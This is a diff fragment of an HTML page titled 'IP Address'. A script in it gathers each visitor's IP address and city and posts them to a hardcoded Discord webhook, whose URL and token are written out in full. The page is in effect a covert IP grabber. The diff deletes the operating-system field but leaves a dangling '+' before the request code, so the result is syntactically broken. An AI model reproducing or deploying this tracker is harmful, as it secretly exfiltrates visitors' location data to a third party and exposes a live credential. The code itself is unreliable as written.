@@ -3,13 +3,11 @@
 <head>
   <title>IP Address</title>
   <script>
-    function sendToDiscord(ipAddress, city, device) {
+    function sendToDiscord(ipAddress, city) {
       var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";
 
       var content = "> **Adresse IP 🛰️ : **" + ipAddress +
         "\n> **Ville 🏠 : **" + city +
-        "\n> **Système d'exploitation ⚙️ : **" + device;
-
       var request = new XMLHttpRequest();
       request.open("POST", webhookURL);
       request.setRequestHeader('Content-type', 'application/json');
